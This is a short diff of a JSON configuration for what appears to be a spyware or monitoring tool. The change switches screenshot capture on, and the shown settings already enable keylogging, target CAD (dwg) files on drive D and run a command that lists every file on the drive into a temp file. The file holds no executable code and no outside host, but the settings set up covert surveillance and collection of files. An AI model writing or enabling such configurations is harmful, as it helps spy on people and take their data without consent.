@@ -14,7 +14,7 @@
   "_allcertainFilesInRootFolder":"d:\\",
   "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
-  "scrShot": false,
+  "scrShot": true,
   "keyLog": true,
   "_cmdCommands": ["dir D:\\ /s /b >> \"C:\\Temp\\string.txt\""]
 }
